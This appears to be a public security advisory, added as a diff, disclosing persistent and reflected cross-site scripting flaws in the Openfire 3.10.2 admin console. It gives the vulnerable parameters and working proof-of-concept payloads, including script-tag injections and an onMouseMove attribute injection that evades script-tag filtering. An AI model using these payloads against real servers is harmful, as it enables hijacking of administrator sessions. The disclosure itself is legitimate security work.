@@ -1,0 +1,137 @@
+[+] Credits: hyp3rlinx
+
+[+] Website: hyp3rlinx.altervista.org
+
+[+] Source:  http://hyp3rlinx.altervista.org/advisories/AS-OPENFIRE-XSS.txt
+
+
+
+Vendor:
+================================
+www.igniterealtime.org/projects/openfire
+www.igniterealtime.org/downloads/index.jsp
+
+
+
+Product:
+================================
+Openfire 3.10.2
+
+Openfire is a real time collaboration (RTC) server licensed under the Open
+Source Apache License.
+It uses the only widely adopted open protocol for instant messaging, XMPP
+(also called Jabber).
+
+
+
+Vulnerability Type:
+===================
+Persistent & Reflected XSS
+
+
+CVE Reference:
+==============
+N/A
+
+
+
+Vulnerability Details:
+=====================
+
+1) Persistent XSS exists when creating an Group Chat Bookmark, XSS will
+execute each time victim accesses
+the 'Group Chat Bookmarks' web page vuln parameter 'groupchatName' XSS will
+be stored in 'ofbookmark'
+table in 'bookmarkName' column of the MySQL DB and will be under
+boomarkType as 'group_chat'.
+
+
+2) Persistent XSS exists when creating URL Bookmarks, vuln parameter
+'urlName' XSS will be stored in 'ofbookmark' table in
+'bookmarkName' column of the MySQL DB will be under column boomarkType as
+'url'.
+
+
+3) Reflected XSS entry point exists in search parameter, script tags fail
+but we can defeat using onMouseMove() JS function.
+
+
+Exploit code(s):
+===============
+
+1) persistent XSS:
+http://localhost:9090/plugins/clientcontrol/create-bookmark.jsp?type=group_chat
+
+Inject <script>alert(666)</script> payload into the 'Group Chat Name' field
+then click 'Create'.
+
+
+2) persistent XSS:
+http://localhost:9090/plugins/clientcontrol/create-bookmark.jsp?type=url
+
+Inject <script>alert('HELL')</script> payload into the 'URL Name' field
+then click 'Create'.
+
+
+3) Reflected XSS:
+http://localhost:9090/server-session-details.jsp?hostname=
+"/><script>alert(666)</script>
+
+
+4) Reflected XSS:
+http://localhost:9090/group-summary.jsp?search="
+onMouseMove="alert('hyp3rlinx')
+
+
+
+Disclosure Timeline:
+=========================================================
+
+Vendor Notification:  NA
+Sept 14, 2015  : Public Disclosure
+
+
+
+
+Exploitation Technique:
+=======================
+Local & Remote
+
+
+
+Severity Level:
+=========================================================
+High
+
+
+
+Description:
+==========================================================
+
+
+Request Method(s):              [+]  POST & GET
+
+
+Vulnerable Product:             [+]  Openfire 3.10.2
+
+
+Vulnerable Parameter(s):        [+]  groupchatName, urlName, hostname,
+search
+
+
+Affected Area(s):               [+]  Admin
+
+
+===========================================================
+
+[+] Disclaimer
+Permission is hereby granted for the redistribution of this advisory,
+provided that it is not altered except by reformatting it, and that due
+credit is given. Permission is explicitly given for insertion in
+vulnerability databases and similar, provided that due credit is given to
+the author.
+The author is not responsible for any misuse of the information contained
+herein and prohibits any malicious use of all security related information
+or exploits by the author or elsewhere.
+
+by hyp3rlinx
